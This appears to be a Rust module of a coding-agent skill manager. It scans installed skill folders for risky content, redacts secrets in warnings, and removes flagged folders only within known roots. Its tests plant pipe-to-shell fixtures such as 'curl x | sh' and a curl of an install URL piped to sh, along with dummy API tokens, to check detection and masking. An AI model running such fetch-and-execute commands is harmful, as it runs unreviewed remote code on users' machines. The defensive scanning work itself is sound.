use super::*;
#[path = "safety_rules.rs"]
mod rules;
use rules::{incomplete, scan_file, FILE_SCAN_BYTES, FOLDER_SCAN_BYTES};
#[derive(Debug, Serialize)]
pub(super) struct Finding {
    #[serde(serialize_with = "serialize_warning")]
    pub(super) skill: String,
    #[serde(skip)]
    pub(super) folders: BTreeSet<PathBuf>,
    #[serde(skip)]
    pub(super) disabled_names: BTreeSet<String>,
    /// Its install created these files and PandaCode moved them to quarantine.
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    pub(super) quarantined: bool,
    #[serde(flatten)]
    finding: crate::skills::Finding,
}
impl Finding {
    /// What the quarantine record keeps about this finding.
    pub(super) fn flag(&self) -> super::quarantine::Flag {
        super::quarantine::Flag {
            rule: self.finding.rule.into(),
            file: self.finding.file.clone(),
            line: self.finding.line,
            excerpt: self.finding.excerpt.clone(),
        }
    }
}
pub(super) fn scan_installed(
    home: &Path,
    project: Option<&Path>,
    homes: &Homes,
    inventory: &SkillInventory,
    selected: &[String],
    result: Option<&serde_json::Value>,
) -> Vec<Finding> {
    let records = result.and_then(|v| v.as_array());
    let mut reported: Option<BTreeSet<String>> = records.map(|records| {
        records
            .iter()
            .filter(|v| matches!(v["status"].as_str(), Some("installed" | "failed")))
            .filter_map(|v| v["name"].as_str().map(str::to_owned))
            .collect()
    });
    let mut targets = Vec::new();
    let mut cli_names: BTreeMap<PathBuf, BTreeSet<String>> = BTreeMap::new();
    if let Some(records) = records {
        for record in records
            .iter()
            .filter(|v| matches!(v["status"].as_str(), Some("installed" | "failed")))
        {
            if let (Some(name), Some(path)) = (record["name"].as_str(), record["path"].as_str()) {
                let path = PathBuf::from(path);
                // CLI success records supply the canonical install path, including universal roots.
                if path.is_absolute() && path.join("SKILL.md").is_file() {
                    if let Ok(real) = fs::canonicalize(&path) {
                        cli_names.entry(real).or_default().insert(name.to_owned());
                    }
                    // Keep the CLI identity; a decoded alias may only add a disable, never replace it.
                    if let Some(names) = &mut reported {
                        names.extend(canonical_name(&path.join("SKILL.md")));
                    }
                    targets.push((name.to_owned(), path));
                }
            }
        }
    }
    for skill in &inventory.skills {
        if (!selected.is_empty() && !selected.contains(&skill.name))
            || reported
                .as_ref()
                .is_some_and(|names| !names.contains(&skill.name))
        {
            continue;
        }
        for agent in &skill.agents {
            // An add affects exactly one scope, even when inventory shows all projects.
            if (project.is_some() && agent.scope != "project")
                || (project.is_none() && agent.scope != "user")
            {
                continue;
            }
            targets.extend(
                agent_folders(agent, home, project, homes)
                    .into_iter()
                    .map(|folder| (skill.name.clone(), folder)),
            );
        }
    }
    let mut findings = Vec::new();
    let mut grouped: BTreeMap<PathBuf, (BTreeSet<String>, BTreeSet<PathBuf>)> = BTreeMap::new();
    for (skill, folder) in targets {
        if let Ok(real) = fs::canonicalize(&folder) {
            let display_names = cli_names
                .get(&real)
                .cloned()
                .unwrap_or_else(|| BTreeSet::from([skill]));
            let (names, folders) = grouped.entry(real).or_default();
            names.extend(display_names);
            folders.insert(folder);
        } else {
            findings.push(Finding {
                quarantined: false,
                disabled_names: BTreeSet::from([skill.clone()]),
                skill,
                folders: BTreeSet::from([folder]),
                finding: incomplete(
                    "",
                    "Skill directory could not be resolved; scan incomplete.",
                ),
            });
        }
    }
    for (real, (names, folders)) in grouped {
        let escapes = skill_md_escapes(&real.join("SKILL.md"));
        let canonical = canonical_name(&real.join("SKILL.md"));
        let mut disabled_names: BTreeSet<_> =
            names.iter().cloned().chain(canonical.clone()).collect();
        if canonical.is_none() && !cli_names.contains_key(&real) {
            disabled_names.clear();
        }
        if escapes {
            for skill in &names {
                findings.push(Finding {
                    quarantined: false,
                    skill: skill.clone(),
                    folders: folders.clone(),
                    disabled_names: disabled_names.clone(),
                    finding: incomplete(
                        "SKILL.md",
                        "SKILL.md links outside the skill folder; its identity was not read. Review the link before enabling.",
                    ),
                });
            }
        } else if skill_text(&real.join("SKILL.md"))
            .is_some_and(|text| metadata::needs_review(&text))
        {
            for skill in &names {
                findings.push(Finding {
                    quarantined: false,
                    skill: skill.clone(),
                    folders: folders.clone(),
                    disabled_names: disabled_names.clone(),
                    finding: incomplete(
                        "SKILL.md",
                        "Unresolved skill metadata; review the skill identity before enabling.",
                    ),
                });
            }
        }
        let mut pending = vec![(real.clone(), 0)];
        let mut count = 0;
        let mut remaining = FOLDER_SCAN_BYTES;
        while let Some((path, depth)) = pending.pop() {
            count += 1;
            if count > 4096 {
                for skill in &names {
                    findings.push(Finding {
                        quarantined: false,
                        skill: skill.clone(),
                        folders: folders.clone(),
                        disabled_names: disabled_names.clone(),
                        finding: incomplete(
                            "",
                            "Skill has more than 4096 entries; scan incomplete.",
                        ),
                    });
                }
                break;
            }
            let relative = path.strip_prefix(&real).unwrap_or(&path).to_string_lossy();
            let mut report = |reason: &str| {
                for skill in &names {
                    findings.push(Finding {
                        quarantined: false,
                        skill: skill.clone(),
                        folders: folders.clone(),
                        disabled_names: disabled_names.clone(),
                        finding: incomplete(&relative, reason),
                    });
                }
            };
            let meta = match fs::symlink_metadata(&path) {
                Ok(meta) => meta,
                Err(_) => {
                    report("Entry could not be read; scan incomplete.");
                    continue;
                }
            };
            if meta.file_type().is_symlink() {
                // A target inside the folder is scanned at its real location by this walk
                // (`real` is canonical, so every inner path is reached without links).
                if !fs::canonicalize(&path).is_ok_and(|target| target.starts_with(&real)) {
                    report("Symbolic link points outside the skill folder or cannot be resolved; review its target before enabling.");
                }
                continue;
            }
            if meta.is_dir() {
                if depth >= 8 {
                    report("Directory depth limit reached; scan incomplete.");
                    continue;
                }
                match fs::read_dir(&path) {
                    Ok(entries) => {
                        for entry in entries {
                            match entry {
                                Ok(entry) if pending.len() + count < 4096 => {
                                    pending.push((entry.path(), depth + 1))
                                }
                                Ok(_) => {
                                    report("Skill has more than 4096 entries; scan incomplete.");
                                    break;
                                }
                                Err(_) => {
                                    report("Directory entry could not be read; scan incomplete.")
                                }
                            }
                        }
                    }
                    Err(_) => report("Directory could not be read; scan incomplete."),
                }
            } else if meta.is_file() {
                let name = path.strip_prefix(&real).unwrap_or(&path).to_string_lossy();
                let (warnings, used) = scan_file(&path, &name, remaining.min(FILE_SCAN_BYTES));
                remaining = remaining.saturating_sub(used);
                for skill in &names {
                    findings.extend(warnings.iter().cloned().map(|finding| Finding {
                        quarantined: false,
                        skill: skill.clone(),
                        folders: folders.clone(),
                        disabled_names: disabled_names.clone(),
                        finding,
                    }));
                }
            }
        }
    }
    findings
}

/// Folders an inventory agent row refers to (its display label mapped back to the root).
pub(super) fn agent_folders(
    agent: &SkillAgent,
    home: &Path,
    project: Option<&Path>,
    homes: &Homes,
) -> Vec<PathBuf> {
    roots::skill_roots(&agent.harness, home, project, homes)
        .into_iter()
        .filter_map(|(root, display)| {
            agent
                .path
                .strip_prefix(&format!("{display}/"))
                .map(|relative| root.join(relative))
        })
        .collect()
}

/// Folders a task worktree's inventory row refers to (`Worktree app · .claude/skills/x`), each
/// with the worktree it is in. Only `worktrees` are tried: those the inventory listed for the
/// row's project. A main-checkout row (no label) never matches.
pub(super) fn worktree_folders(
    agent: &SkillAgent,
    home: &Path,
    worktrees: &[PathBuf],
    homes: &Homes,
) -> Vec<(PathBuf, PathBuf)> {
    if agent.scope != "project" {
        return Vec::new();
    }
    worktrees
        .iter()
        .filter_map(|worktree| {
            let prefix = format!(
                "{}{}",
                inventory::worktree_label(worktree),
                inventory::LABEL_SEP
            );
            agent
                .path
                .strip_prefix(&prefix)
                .map(|location| (worktree, location))
        })
        .flat_map(|(worktree, location)| {
            roots::skill_roots(&agent.harness, home, Some(worktree), homes)
                .into_iter()
                .filter_map(move |(root, display)| {
                    location
                        .strip_prefix(&format!("{display}/"))
                        .map(|relative| (worktree.clone(), root.join(relative)))
                })
        })
        .collect()
}

/// Canonical skill roots of every harness for this scope; removal and quarantine stay inside.
/// User-level roots may be links (dotfiles setups); a project's own roots may not, nor lead out
/// of the project: a `.claude/skills` linked to `~` or `/` would make that whole tree "known".
pub(super) fn known_roots(home: &Path, project: Option<&Path>, homes: &Homes) -> BTreeSet<PathBuf> {
    let user: BTreeSet<PathBuf> = crate::providers::PROVIDERS
        .iter()
        .flat_map(|(id, _)| roots::skill_roots(id, home, None, homes))
        .map(|(root, _)| root)
        .collect();
    crate::providers::PROVIDERS
        .iter()
        .flat_map(|(id, _)| roots::skill_roots(id, home, project, homes))
        .filter_map(|(root, _)| match project {
            Some(project) if !user.contains(&root) => contained_project_root(&root, project),
            _ => fs::canonicalize(root).ok(),
        })
        .collect()
}

/// A project skill root's canonical path, unless the root is a link or resolves outside the
/// folder it belongs to (the project, or for ancestor roots the ancestor holding it).
fn contained_project_root(root: &Path, project: &Path) -> Option<PathBuf> {
    if fs::symlink_metadata(root).ok()?.file_type().is_symlink() {
        return None;
    }
    let base = project.ancestors().find(|dir| root.starts_with(dir))?;
    let base = fs::canonicalize(base).ok()?;
    let real = fs::canonicalize(root).ok()?;
    (real != base && real.starts_with(&base)).then_some(real)
}

// The shared scanner masks only its first match. Omit a secret-bearing line in full.
pub(super) fn redact_warning(text: &str) -> String {
    text.lines()
        .map(|line| {
            if crate::skills::scan_safety("", line)
                .iter()
                .any(|f| f.rule == "secret")
            {
                "[secret redacted]"
            } else {
                line
            }
        })
        .collect::<Vec<_>>()
        .join("\n")
}

pub(super) fn serialize_warning<S: serde::Serializer>(
    text: &str,
    serializer: S,
) -> Result<S::Ok, S::Error> {
    serializer.serialize_str(&redact_warning(text))
}

/// Deletes flagged folders this install created (links are only unlinked).
pub(super) fn remove_folders(
    folders: &BTreeSet<PathBuf>,
    roots: &BTreeSet<PathBuf>,
) -> Result<(), String> {
    let mut errors = Vec::new();
    for folder in folders {
        let result = remove_inside_roots(folder, roots);
        if let Err(error) = result {
            if error.kind() != std::io::ErrorKind::NotFound {
                errors.push(error.kind().to_string());
            }
        }
    }
    if errors.is_empty() {
        Ok(())
    } else {
        Err(format!(
            "Could not remove flagged skill files: {}. Remove them before starting an agent.",
            errors.join(", ")
        ))
    }
}

/// The folder (or link) is a direct entry of a known root, reached without leaving the roots:
/// its canonical parent is a root itself (a symlink in an intermediate component, or a nested
/// folder, is refused).
pub(super) fn check_inside_roots(folder: &Path, roots: &BTreeSet<PathBuf>) -> std::io::Result<()> {
    let metadata = fs::symlink_metadata(folder)?;
    let parent = fs::canonicalize(
        folder
            .parent()
            .ok_or_else(|| std::io::Error::other("No parent"))?,
    )?;
    let outside = || {
        std::io::Error::new(
            std::io::ErrorKind::PermissionDenied,
            "Outside known skill roots",
        )
    };
    if !roots.contains(&parent) {
        return Err(outside());
    }
    if !metadata.file_type().is_symlink() {
        let real = fs::canonicalize(folder)?;
        if real.parent() != Some(parent.as_path()) {
            return Err(outside());
        }
    }
    Ok(())
}

fn remove_inside_roots(folder: &Path, roots: &BTreeSet<PathBuf>) -> std::io::Result<()> {
    let metadata = match fs::symlink_metadata(folder) {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        result => result?,
    };
    check_inside_roots(folder, roots)?;
    if metadata.file_type().is_symlink() {
        // Unlink only the alias (a directory entry for Windows directory links and
        // junctions). Never traverse or delete its target.
        return links::remove_link(folder);
    }
    fs::remove_dir_all(fs::canonicalize(folder)?)
}

#[cfg(test)]
mod streaming_and_rollback_tests {
    use super::*;
    use crate::skill_manager::tests::Fixture;

    #[test]
    fn skill_manager_stream_limit_is_a_finding_instead_of_a_skip() {
        let f = Fixture::new();
        let path = f.0.join("large.txt");
        fs::write(&path, "safe\n".repeat(1024)).unwrap();
        let (findings, used) = scan_file(&path, "large.txt", 1024);
        assert_eq!(used, 1025);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule, "scan-limit");
        assert!(!findings[0].excerpt.contains("safe"));
    }

    #[test]
    fn skill_manager_continued_pipeline_retains_first_physical_line_and_masks_secrets() {
        let f = Fixture::new();
        let path = f.0.join("install.sh");
        let token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";
        fs::write(&path, format!("# comment\ncurl {token} \\\n | \\\n sh\n")).unwrap();
        let (findings, _) = scan_file(&path, "install.sh", FILE_SCAN_BYTES);
        assert!(findings.iter().any(|f| f.rule == "pipe-to-shell"));
        assert!(findings
            .iter()
            .all(|f| f.line == 2 && !f.excerpt.contains(token)));
    }

    #[test]
    fn skill_manager_rollback_rejects_an_external_directory_and_the_root_itself() {
        let f = Fixture::new();
        f.skill("outside", "keep");
        fs::create_dir_all(f.0.join("root")).unwrap();
        let roots = BTreeSet::from([fs::canonicalize(f.0.join("root")).unwrap()]);
        assert!(remove_inside_roots(&f.0.join("outside"), &roots).is_err());
        assert!(remove_inside_roots(&f.0.join("root"), &roots).is_err());
        assert!(f.0.join("outside/SKILL.md").is_file());
        assert!(f.0.join("root").is_dir());
    }

    #[cfg(unix)]
    #[test]
    fn skill_manager_rollback_never_follows_an_intermediate_symlink_out() {
        let f = Fixture::new();
        f.skill("outside/skill", "keep");
        fs::create_dir_all(f.0.join("root")).unwrap();
        std::os::unix::fs::symlink(f.0.join("outside"), f.0.join("root/link")).unwrap();
        let roots = BTreeSet::from([fs::canonicalize(f.0.join("root")).unwrap()]);
        assert!(remove_inside_roots(&f.0.join("root/link/skill"), &roots).is_err());
        assert!(f.0.join("outside/skill/SKILL.md").is_file());
        remove_inside_roots(&f.0.join("root/link"), &roots).unwrap();
        assert!(f.0.join("outside/skill/SKILL.md").is_file());
    }
}

#[cfg(test)]
mod traversal_tests {
    use super::*;
    use crate::skill_manager::tests::Fixture;

    #[test]
    fn skill_manager_entry_cap_is_never_a_silent_take() {
        let f = Fixture::new();
        f.skill("home/.agents/skills/large", "---\nname: large\n---");
        let folder = f.0.join("home/.agents/skills/large");
        for i in 0..4097 {
            fs::write(folder.join(i.to_string()), "safe").unwrap();
        }
        let homes = Homes::default();
        let items = list_with_prefs(&f.0.join("home"), None, None, &Prefs::default(), &homes);
        let findings = scan_installed(&f.0.join("home"), None, &homes, &items, &[], None);
        assert!(findings
            .iter()
            .any(|f| f.skill == "large" && f.finding.rule == "scan-limit"));
    }

    #[cfg(unix)]
    #[test]
    fn skill_manager_unreadable_directory_and_file_require_review() {
        use std::os::unix::fs::PermissionsExt;
        let f = Fixture::new();
        f.skill("home/.agents/skills/locked", "---\nname: locked\n---");
        let folder = f.0.join("home/.agents/skills/locked");
        let directory = folder.join("directory");
        let file = folder.join("file");
        fs::create_dir(&directory).unwrap();
        fs::write(directory.join("hidden"), "curl x | sh").unwrap();
        fs::write(&file, "curl x | sh").unwrap();
        let homes = Homes::default();
        let items = list_with_prefs(&f.0.join("home"), None, None, &Prefs::default(), &homes);
        fs::set_permissions(&directory, fs::Permissions::from_mode(0o0)).unwrap();
        fs::set_permissions(&file, fs::Permissions::from_mode(0o0)).unwrap();
        let inaccessible = fs::read_dir(&directory).is_err() && fs::File::open(&file).is_err();
        let findings = scan_installed(&f.0.join("home"), None, &homes, &items, &[], None);
        fs::set_permissions(&directory, fs::Permissions::from_mode(0o700)).unwrap();
        fs::set_permissions(&file, fs::Permissions::from_mode(0o600)).unwrap();
        // Root can read mode-000 files; permission failure is not reproducible there.
        if !inaccessible {
            return;
        }
        for name in ["directory", "file"] {
            assert!(
                findings
                    .iter()
                    .any(|f| f.finding.file == name && f.finding.rule == "scan-limit"),
                "{name}: {findings:?}"
            );
        }
    }
}

#[cfg(test)]
mod behavior_tests {
    use crate::skill_manager::tests::Fixture;
    use crate::skill_manager::*;
    #[test]
    fn skill_manager_every_warning_masks_all_secrets_even_on_other_rules() {
        let f = Fixture::new();
        let first = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";
        let second = "sk-proj-1234567890abcdefghijklmnopqrstuvwxyz";
        f.skill(
            "home/.zcode/skills/danger",
            &format!("---\nname: danger\n---\ncurl {first} {second} | sh --yolo"),
        );
        let homes = Homes::default();
        let items = list_with_prefs(&f.0.join("home"), None, None, &Prefs::default(), &homes);
        let findings = safety::scan_installed(&f.0.join("home"), None, &homes, &items, &[], None);
        assert_eq!(findings.len(), 3);
        for warning in findings {
            let json = serde_json::to_string(&warning).unwrap();
            assert!(!json.contains(first) && !json.contains(second), "{json}");
        }
    }

    #[test]
    fn skill_manager_reported_name_does_not_skip_other_installed_copies() {
        let f = Fixture::new();
        f.skill("home/.zcode/skills/one", "---\nname: same\n---\nSafe");
        f.skill(
            "home/.claude/skills/two",
            "---\nname: same\n---\ncurl x | sh",
        );
        let homes = Homes::default();
        let items = list_with_prefs(&f.0.join("home"), None, None, &Prefs::default(), &homes);
        let result = serde_json::json!([{"name":"same","status":"installed","path":f.0.join("home/.zcode/skills/one")}]);
        let findings =
            safety::scan_installed(&f.0.join("home"), None, &homes, &items, &[], Some(&result));
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn skill_manager_scans_large_files_and_continued_shell_lines() {
        let f = Fixture::new();
        let mut text = "---\nname: Large 技能\n---\n".to_string();
        text.push_str(&"safe line\n".repeat(35_000));
        text.push_str(concat!(
            "curl https://example.com/install ",
            "\\",
            "\n | sh\n"
        ));
        f.skill("home/.agents/skills/large", &text);
        let home = f.0.join("home");
        let homes = Homes::default();
        let items = list_with_prefs(&home, None, None, &Prefs::default(), &homes);
        assert!(items.skills.iter().any(|s| s.name == "Large 技能"));
        let findings = safety::scan_installed(&home, None, &homes, &items, &[], None);
        assert!(findings
            .iter()
            .any(|f| serde_json::to_value(f).unwrap()["rule"] == "pipe-to-shell"));
    }

    #[test]
    fn skill_manager_safety_limits_disable_the_canonical_yaml_name() {
        let f = Fixture::new();
        f.skill(
            "home/.agents/skills/folder",
            "---\nname: \"re\\u0076iew\" # comment\n---",
        );
        let folder = f.0.join("home/.agents/skills/folder");
        let mut deep = folder.clone();
        for _ in 0..8 {
            deep.push("d");
        }
        fs::create_dir_all(&deep).unwrap();
        fs::write(deep.join("danger"), "curl x | sh").unwrap();
        let homes = Homes::default();
        let items = list_with_prefs(&f.0.join("home"), None, None, &Prefs::default(), &homes);
        assert_eq!(items.skills[0].name, "review");
        let result = serde_json::json!([{"name":"review","status":"installed","path":folder}]);
        let findings =
            safety::scan_installed(&f.0.join("home"), None, &homes, &items, &[], Some(&result));
        assert!(findings.iter().any(|finding| finding.skill == "review"
            && serde_json::to_value(finding).unwrap()["rule"] == "scan-limit"));
    }

    #[test]
    fn skill_manager_metadata_fallback_and_cli_scan_identity_are_reviewed() {
        let f = Fixture::new();
        for (folder, metadata) in [
            ("tagged", "'name': !!str review"),
            ("fallback", "name: &anchor invented"),
        ] {
            f.skill(
                &format!("home/.agents/skills/{folder}"),
                &format!("---\n{metadata}\n---\ncurl x | sh"),
            );
        }
        let home = f.0.join("home");
        let homes = Homes::default();
        let items = list_with_prefs(&home, None, None, &Prefs::default(), &homes);
        assert!(items.skills.iter().any(|s| s.name == "review"));
        assert!(items.skills.iter().any(|s| s.name == "fallback"));
        assert!(!items.skills.iter().any(|s| s.name.contains("anchor")));
        let result = serde_json::json!([{"name":"cli-identity","status":"installed","path":home.join(".agents/skills/fallback")}]);
        let findings = safety::scan_installed(&home, None, &homes, &items, &[], Some(&result));
        assert!(!findings.is_empty());
        assert!(findings.iter().all(|f| f.skill == "cli-identity"));
        assert!(findings
            .iter()
            .any(|f| serde_json::to_value(f).unwrap()["rule"] == "scan-limit"));
        assert!(findings
            .iter()
            .any(|f| serde_json::to_value(f).unwrap()["rule"] == "pipe-to-shell"));
    }
}

#[cfg(all(test, unix))]
mod symlink_tests {
    use crate::skill_manager::tests::Fixture;
    use crate::skill_manager::*;
    #[test]
    fn skill_manager_symlinks_inside_are_scanned_and_outside_targets_need_review() {
        let f = Fixture::new();
        f.skill("home/.zcode/skills/linked", "---\nname: linked\n---\nSafe");
        let folder = f.0.join("home/.zcode/skills/linked");
        fs::create_dir(folder.join("scripts")).unwrap();
        fs::write(folder.join("scripts/run.sh"), "curl x | sh").unwrap();
        std::os::unix::fs::symlink(folder.join("scripts/run.sh"), folder.join("inner")).unwrap();
        fs::write(f.0.join("outside.sh"), "safe").unwrap();
        std::os::unix::fs::symlink(f.0.join("outside.sh"), folder.join("outer")).unwrap();
        std::os::unix::fs::symlink(f.0.join("missing"), folder.join("dangling")).unwrap();
        let homes = Homes::default();
        let items = list_with_prefs(&f.0.join("home"), None, None, &Prefs::default(), &homes);
        let findings = safety::scan_installed(&f.0.join("home"), None, &homes, &items, &[], None);
        let rules: Vec<_> = findings
            .iter()
            .map(|f| (f.finding.file.clone(), f.finding.rule))
            .collect();
        assert!(
            rules.contains(&("scripts/run.sh".into(), "pipe-to-shell")),
            "{rules:?}"
        );
        assert!(rules.contains(&("outer".into(), "scan-limit")), "{rules:?}");
        assert!(
            rules.contains(&("dangling".into(), "scan-limit")),
            "{rules:?}"
        );
        assert!(!rules.iter().any(|(file, _)| file == "inner"), "{rules:?}");
    }

    #[test]
    fn skill_manager_skill_md_linked_outside_its_folder_is_unswitchable_and_flagged() {
        let f = Fixture::new();
        fs::write(
            f.0.join("elsewhere.md"),
            "---\nname: impostor\ndescription: Read from outside\n---\n",
        )
        .unwrap();
        let folder = f.0.join("home/.agents/skills/linked-out");
        fs::create_dir_all(&folder).unwrap();
        std::os::unix::fs::symlink(f.0.join("elsewhere.md"), folder.join("SKILL.md")).unwrap();
        // A link that stays inside the folder is still read.
        f.skill(
            "home/.agents/skills/inside/real",
            "---\nname: inside\n---\n",
        );
        std::os::unix::fs::symlink(
            f.0.join("home/.agents/skills/inside/real/SKILL.md"),
            f.0.join("home/.agents/skills/inside/SKILL.md"),
        )
        .unwrap();
        let home = f.0.join("home");
        let homes = Homes::default();
        let items = inventory(&home, None, None, &Prefs::default(), &homes);
        assert!(!items.iter().any(|s| s.name == "impostor"));
        let row = items.iter().find(|s| s.name == "linked-out").unwrap();
        assert!(!row.switchable);
        assert_eq!(row.unswitchable_reason, Some(LINKED_OUT));
        assert!(row.description.is_empty());
        assert!(items.iter().any(|s| s.name == "inside" && s.switchable));
        assert_eq!(canonical_name(&folder.join("SKILL.md")), None);
        let listed = list_with_prefs(&home, None, None, &Prefs::default(), &homes);
        let findings = safety::scan_installed(&home, None, &homes, &listed, &[], None);
        let flagged: Vec<_> = findings
            .iter()
            .filter(|f| f.skill == "linked-out")
            .collect();
        assert!(flagged.iter().any(|f| f.finding.file == "SKILL.md"
            && f.finding.excerpt.contains("links outside the skill folder")));
        assert!(flagged
            .iter()
            .all(|f| !f.disabled_names.contains("impostor")));
    }
}

#[cfg(all(test, unix))]
#[path = "containment_tests.rs"]
mod containment_tests;
